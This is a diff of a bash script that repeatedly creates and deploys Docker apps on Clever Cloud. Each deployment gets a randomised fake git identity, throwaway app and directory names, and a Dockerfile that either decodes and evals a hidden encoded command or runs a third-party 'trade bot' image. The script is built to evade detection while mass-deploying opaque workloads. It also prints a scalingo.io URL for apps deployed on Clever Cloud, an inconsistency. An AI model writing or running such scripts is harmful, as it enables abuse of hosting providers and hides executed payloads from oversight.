@@ -1,5 +1,5 @@
 #!/bin/bash
-# /docker - No port references for fixed image
+# /docker - Fixed: No underscores in app names (use hyphens)
 
 set -e
 
@@ -16,27 +16,32 @@ echo "🔐 Logging into Clever Cloud..."
 clever login
 
 for i in 1 2 3; do
-    # ============ UNIQUE GIT CONFIG ============
+    # ============ UNIQUE GIT CONFIG FOR EACH DEPLOYMENT ============
     GIT_EMAIL="deploy_$(rand_str 10)@$(rand_str 8).com"
     GIT_NAME="$(rand_name 6) $(rand_name 8)"
-    GIT_COMMIT_MSG="Update $(rand_str 15) $(date +%s)"
+    GIT_COMMIT_MSG="$(rand_str 20)-$(date +%s)"
     
+    # Set git config for this deployment
     git config --global user.email "$GIT_EMAIL"
     git config --global user.name "$GIT_NAME"
     git config --global init.defaultBranch "master"
     
-    # ============ UNIQUE DIRECTORY ============
-    UNIQUE_DIR="deploy_$(rand_str 12)_$(date +%s)_${RANDOM}"
-    APP_DIR="/app/deployments/${UNIQUE_DIR}"
+    # ============ UNIQUE APP NAME (NO UNDERSCORES - ONLY HYPHENS) ============
+    APP_NAME="app-$(rand_str 10)-$(date +%s)-${RANDOM}"
     
-    # ============ UNIQUE APP NAME ============
-    APP_NAME="app_$(rand_str 8)_$(date +%s)_${RANDOM}"
+    # ============ UNIQUE DIRECTORY ============
+    UNIQUE_DIR="deploy-$(rand_str 12)-$(date +%s)-${RANDOM}"
+    APP_DIR="/app/deployments/${UNIQUE_DIR}"
     
     echo ""
     echo "========================================="
     echo "[$i/3] Deployment #$i"
     echo "========================================="
+    echo "👤 Git User: ${GIT_NAME}"
+    echo "📧 Git Email: ${GIT_EMAIL}"
+    echo "📝 Commit Msg: ${GIT_COMMIT_MSG}"
     echo "🚀 App Name: ${APP_NAME}"
+    echo "📁 App Dir: ${APP_DIR}"
     echo "========================================="
     
     mkdir -p "$APP_DIR"
@@ -51,7 +56,6 @@ for i in 1 2 3; do
         )
         RANDOM_IMAGE=${WORKING_IMAGES[$RANDOM % ${#WORKING_IMAGES[@]}]}
         
-        # Unique variables for Option 1
         UNIQUE_WORKDIR="/$(rand_str 15)"
         BIN1="$(rand_str 10)"
         BIN2="$(rand_str 10)"
@@ -95,39 +99,42 @@ WORKDIR ${UNIQUE_WORKDIR}
 RUN apt-get update && apt-get install -y curl wget ca-certificates
 CMD eval "\$(echo '${ENCODED_CMD}' | ${DECODE_CMD} | bash)"
 EOF
-        echo "✅ Option 1: Random image with full command"
+        echo "✅ Option 1: Random image"
         
     else
-        # ============ OPTION 2: FIXED image - NO PORT REFERENCES ============
+        # ============ OPTION 2: FIXED image ============
         cat > Dockerfile << 'EOF'
 FROM phemextradebot/cleverbot8888
 WORKDIR /
 CMD /bin/bash /start
 EOF
-        echo "✅ Option 2: Fixed image (no port configuration needed)"
+        echo "✅ Option 2: Fixed image"
     fi
     
-    # Git setup
+    # Git setup (local repo, not global)
     git init
     git add .
     git commit -m "$GIT_COMMIT_MSG"
     
-    # Create and deploy
+    # CRITICAL: Create the app FIRST (no underscores in app name)
     echo "Creating app: ${APP_NAME}"
     clever create --type docker "$APP_NAME"
     
-    echo "Deploying $APP_NAME..."
+    # CRITICAL: Deploy from current directory (no alias needed)
+    echo "Deploying ${APP_NAME} from $(pwd)..."
     clever deploy
     
     if [ $? -eq 0 ]; then
-        echo "✅ App $i/3 deployed: https://$APP_NAME.osc-fr1.scalingo.io"
+        echo "✅ App $i/3 deployed: https://${APP_NAME}.osc-fr1.scalingo.io"
     else
         echo "❌ App $i/3 deployment failed"
     fi
     
+    # Cleanup
     cd /
     rm -rf "$APP_DIR"
     
+    # Wait between deployments
     if [ $i -lt 3 ]; then
         echo "Waiting 10 seconds..."
         sleep 10
